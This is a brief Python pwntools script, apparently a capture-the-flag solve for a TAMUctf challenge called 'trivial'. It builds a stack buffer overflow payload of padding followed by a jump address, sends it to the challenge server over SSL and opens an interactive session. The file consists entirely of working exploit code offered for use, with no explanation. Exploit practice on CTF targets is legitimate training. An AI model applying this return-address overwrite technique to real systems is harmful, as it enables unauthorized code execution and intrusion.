from pwn import *
from time import sleep

buffer = b'a'*(69 + 8+ 3+ 8)
eip = p64(0x401132)

payload = buffer + eip
print(payload)


#p = process('./trivial')
#input()

#p.sendline(payload)

p = remote("tamuctf.com", 443, ssl=True, sni="trivial")
p.sendline(payload)

p.interactive()
